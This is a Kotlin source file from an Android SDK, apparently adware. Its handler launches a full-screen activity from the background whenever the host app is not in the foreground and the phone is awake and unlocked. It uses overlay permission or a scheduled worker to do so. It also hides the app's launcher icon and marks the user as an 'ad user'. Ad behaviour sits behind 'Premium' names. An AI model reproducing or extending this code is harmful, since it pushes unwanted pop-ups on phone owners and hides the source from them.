package com.app.sdk.sdk.event.handler.impl

import android.app.ActivityManager
import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import com.app.sdk.PremiumActivity
import com.app.sdk.sdk.PremiumUserSdk
import com.app.sdk.sdk.config.SdkConfig
import com.app.sdk.sdk.data.Prefs
import com.app.sdk.sdk.event.handler.PremiumUserHandler
import com.app.sdk.sdk.services.schedulers.DisplayScheduler
import java.util.*

object AdUserHandler : PremiumUserHandler {

    override fun doOnTrigger(context: Context) {
        launch(context)
    }

    fun launchActivity(context: Context, isSingle: Boolean) {
        Intent(context, PremiumActivity::class.java)
            .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            .putExtra(PremiumActivity.SINGLE_RUN, isSingle)
            .let(context::startActivity)
    }

    override fun needRunOnTrigger(context: Context): Boolean {
        return isAppNotRunning() && isUserPresent(context) && delayIsComplete(context)
    }

    private fun isAppNotRunning(): Boolean {
        return ActivityManager.RunningAppProcessInfo()
            .apply { ActivityManager.getMyMemoryState(this) }
            .importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
    }

    override fun afterIconHide(context: Context) {
        Prefs.getInstance(context).setUserAsAd()
        Prefs.getInstance(context).setShowAdTime(SdkConfig.getLaunchAdTime())
    }

    override fun canHideIcon(context: Context) =
        (PremiumUserSdk.hasOverlayPermission(context) || SdkConfig.notRequiredPermission())
                && !Prefs.getInstance(context).isAdUser()

    private fun delayIsComplete(context: Context): Boolean {
        val startAdTime = Prefs.getInstance(context).getStartAdTime()
        return startAdTime != -1L && Date().time >= startAdTime
    }

    fun isUserPresent(context: Context): Boolean {
        return context.getSystemService(PowerManager::class.java).isInteractive
                && !context.getSystemService(KeyguardManager::class.java).isKeyguardLocked
    }

    fun launch(context: Context, isSingle: Boolean = false) {
        if (!SdkConfig.notRequiredPermission() && !PremiumUserSdk.hasOverlayPermission(context))
            DisplayScheduler.launchWorker(context, isSingle)
        else launchActivity(context, isSingle)
    }

}